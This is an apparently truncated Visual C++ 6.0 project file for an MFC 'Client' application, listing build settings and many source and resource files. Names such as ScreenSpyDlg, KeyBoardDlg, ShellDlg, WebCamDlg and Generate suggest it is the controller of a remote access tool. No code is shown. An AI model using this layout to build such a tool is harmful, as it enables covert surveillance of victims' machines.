# Microsoft Developer Studio Project File - Name="Client" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Client - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak" CFG="Client - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Client - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "Client - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "Client - Win32 Release"

# PROP BASE Use_MFC 5
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /w /W0 /GX /Zi /Od /I "Include" /I "..\common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FD /Zm1000 /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 ..\common\libxvidcore.lib ..\common\va_g729a.lib nafxcw.lib /nologo /subsystem:windows /map /debug /machine:I386 /out:"../Bin/Client.exe"

!ELSEIF  "$(CFG)" == "Client - Win32 Debug"

# PROP BASE Use_MFC 5
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /Yu"stdafx.h" /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept

!ENDIF 

# Begin Target

# Name "Client - Win32 Release"
# Name "Client - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\ChangeGroup.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\cJSON.c
# End Source File
# Begin Source File

SOURCE=.\Client.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.rc
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientView.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Dib.cpp
# End Source File
# Begin Source File

SOURCE=.\Download.cpp
# End Source File
# Begin Source File

SOURCE=.\FileAttr.cpp
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Generate.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\HtmlCtrl.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Icons.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\LFileName.cpp
# End Source File
# Begin Source File

SOURCE=.\Login.cpp
# End Source File
# Begin Source File

SOURCE=.\LogView.cpp
# End Source File
# Begin Source File

SOURCE=.\MainFrm.cpp
# End Source File
# Begin Source File

SOURCE=.\MapDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\MsgBox.cpp
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.cpp
# End Source File
# Begin Source File

SOURCE=.\Openweb.cpp
# End Source File
# Begin Source File

SOURCE=.\PcView.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\PictureEx.cpp
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\QQInfoDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Setting.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.cpp
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\ShowWave.cpp
# End Source File
# Begin Source File

SOURCE=.\SortListCtrl.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.cpp
# End Source File
# Begin Source File

SOURCE=.\Start.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Systeminfo.cpp
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Tools.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\TrueColorToolBar.cpp
# End Source File
# Begin Source File

SOURCE=.\Weather.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.cpp
# End Source File
# Begin Source File

SOURCE=..\common\xvidsdk\XvidDec.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=..\common\Audio.h
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.h
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\ChangeGroup.h
# End Source File
# Begin Source File

SOURCE=.\Include\cJSON.h
# End Source File
# Begin Source File

SOURCE=.\Client.h
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.h
# End Source File
# Begin Source File

SOURCE=.\ClientView.h
# End Source File
# Begin Source File

SOURCE=.\Include\Dib.h
# End Source File
# Begin Source File

SOURCE=.\Download.h
# End Source File
# Begin Source File

SOURCE=.\FileAttr.h
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.h
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.h
# End Source File
# Begin Source File

SOURCE=.\Generate.h
# End Source File
# Begin Source File

SOURCE=.\Include\HtmlCtrl.h
# End Source File
# Begin Source File

SOURCE=.\Include\Icons.h
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.h
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.h
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.h
# End Source File
# Begin Source File

SOURCE=.\LFileName.h
# End Source File
# Begin Source File

SOURCE=.\Login.h
# End Source File
# Begin Source File

SOURCE=.\LogView.h
# End Source File
# Begin Source File

SOURCE=..\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\MainFrm.h
# End Source File
# Begin Source File

SOURCE=.\MapDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\Mapper.h
# End Source File
# Begin Source File

SOURCE=.\MsgBox.h
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.h
# End Source File
# Begin Source File

SOURCE=.\Openweb.h
# End Source File
# Begin Source File

SOURCE=.\PcView.h
# End Source File
# Begin Source File

SOURCE=.\Include\PictureEx.h
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.h
# End Source File
# Begin Source File

SOURCE=.\QQInfoDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.h
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.h
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.h
# End Source File
# Begin Source File

SOURCE=.\Setting.h
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.h
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\ShowWave.h
# End Source File
# Begin Source File

SOURCE=.\SortListCtrl.h
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.h
# End Source File
# Begin Source File

SOURCE=.\Start.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.h
# End Source File
# Begin Source File

SOURCE=.\Systeminfo.h
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.h
# End Source File
# Begin Source File

SOURCE=.\Tools.h
# End Source File
# Begin Source File

SOURCE=.\Include\TrueColorToolBar.h
# End Source File
# Begin Source File

SOURCE=.\Weather.h
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.h
# End Source File
# Begin Source File

SOURCE=..\common\xvidsdk\XvidDec.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\res\ClientBmp\1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\1.cur
# End Source File
# Begin Source File

SOURCE=.\res\RezIco\1.ico
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\10.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\2.cur
# End Source File
# Begin Source File

SOURCE=.\res\RezIco\201.ico
# End Source File
# Begin Source File

SOURCE=.\res\RezIco\202.ico
# End Source File
# Begin Source File

SOURCE=.\res\RezIco\203.ico
# End Source File
# Begin Source File

SOURCE=.\res\RezIco\204.ico
# End Source File
# Begin Source File

SOURCE=.\res\RezIco\205.ico
# End Source File
# Begin Source File

SOURCE=.\res\RezIco\206.ico
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\6.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\7.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\8.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\9.bmp
# End Source File
# Begin Source File

SOURCE=.\res\aaaa.gif
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\baoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\baoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\baoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\baoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\baoyuzhuandabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\baoyuzhuandabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\bitmap1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Client.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.rc2
# End Source File
# Begin Source File

SOURCE=.\res\ClientDoc.ico
# End Source File
# Begin Source File

SOURCE=.\res\HOSTLISTICO\CPU.ico
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\dabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\dabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\dabaoyuzhuantedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\dabaoyuzhuantedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\daxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\daxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\daxuezhuanbaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\daxuezhuanbaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\dayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\dayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\dayuzhuanbaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\dayuzhuanbaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\dongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\dongyu.ico"
# End Source File
# Begin Source File

SOURCE=.\res\dot.cur
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\duoyun.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\duoyun.ico"
# End Source File
# Begin Source File

SOURCE=.\res\iconew\FILE.ico
# End Source File
# Begin Source File

SOURCE=.\res\FileToolBarDisable.bmp
# End Source File
# Begin Source File

SOURCE=.\res\FileToolBarHot.bmp
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\fuchen.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\fuchen.ico"
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\ico00001.ico
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\icon209.ico
# End Source File
# Begin Source File

SOURCE=.\res\ImagIoc\Icon_C.ico
# End Source File
# Begin Source File

SOURCE=.\res\ImagIoc\Icon_D.ico
# End Source File
# Begin Source File

SOURCE=.\res\ImagIoc\Icon_E.ico
# End Source File
# Begin Source File

SOURCE=.\res\ImagIoc\Icon_F.ico
# End Source File
# Begin Source File

SOURCE=.\res\ImagIoc\Icon_G.ico
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\leizhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\leizhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\leizhenyubanyoubingbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\leizhenyubanyoubingbao.ico"
# End Source File
# Begin Source File

SOURCE=.\res\HOSTLISTICO\MAC.ico
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\mai.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\mai.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\qiangshachenbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\qiangshachenbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\qing.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\qing.ico"
# End Source File
# Begin Source File

SOURCE=.\res\HOSTLISTICO\QQ.ico
# End Source File
# Begin Source File

SOURCE=.\res\SearchToolBar.bmp
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\shachenbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\shachenbao.ico"
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\SYSTEM.bmp
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\tedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\tedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=.\res\Toolbar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar5.bmp
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\wu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\wu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\xiaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\xiaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\xiaoxuezhuanzhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\xiaoxuezhuanzhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\xiaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\xiaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\xiaoyuzhuanzhongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\xiaoyuzhuanzhongyu.ico"
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\xtsz.bmp
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\yangsha.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\yangsha.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\yin.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\yin.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\yujiaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\yujiaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\zhenxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\zhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\zhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\zhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\zhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\zhongxuezhuandaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\zhongxuezhuandaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\zhongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\zhongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\day\zhongyuzhuandayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\????????????????\night\zhongyuzhuandayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\SystemIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\SystemIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\HOSTLISTICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\????????.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????(??).ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\????????.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientIco\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\????????.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\??????????.ico"
# End Source File
# Begin Source File

